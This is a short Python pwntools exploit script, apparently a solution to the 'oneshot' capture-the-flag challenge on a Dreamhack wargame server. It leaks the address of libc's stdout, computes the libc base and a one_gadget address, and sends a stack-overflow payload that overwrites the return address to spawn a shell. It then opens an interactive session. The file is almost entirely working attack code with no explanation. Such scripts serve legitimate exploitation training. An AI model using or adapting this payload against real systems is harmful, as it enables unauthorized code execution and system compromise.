from pwn import *

e = ELF('./oneshot')
rop = ROP(e)

# local
#r = process('./oneshot')
#libc = e.libc

# remote
r = remote('host3.dreamhack.games', 17435)
libc = ELF('./libc-2.23.so')

ONE_GADGET_LIST = [0x45226, 0x4527a, 0xf03a4, 0xf1247]

#pause()

r.recvuntil(b'stdout: ')
STDOUT_ADDR = int(r.recvuntil(b'\n', drop=True).decode(), 0)
LIBC_STDOUT_OFFSET = libc.symbols['_IO_2_1_stdout_']
LIBC_BASE = STDOUT_ADDR - LIBC_STDOUT_OFFSET
LIBC_ONE_GADGET = LIBC_BASE + ONE_GADGET_LIST[0]

print('[+] STDOUT ADDR is ' + str(hex(STDOUT_ADDR)))
print('[+] Libc\'s STDOUT OFFSET is ' + str(hex(LIBC_STDOUT_OFFSET)))
print('[+] Libc Base Addr is ' + str(hex(LIBC_BASE)))
print('[+] Libc One Gadget Addr is ' + str(hex(LIBC_ONE_GADGET)))

PAYLOAD = b'\x41' * 0x18 + b'\x00' * 0x8 + b'\x42' * 0x8 + p64(LIBC_ONE_GADGET)

print(r.recvuntil(b'MSG: '))

r.send(PAYLOAD)

r.interactive()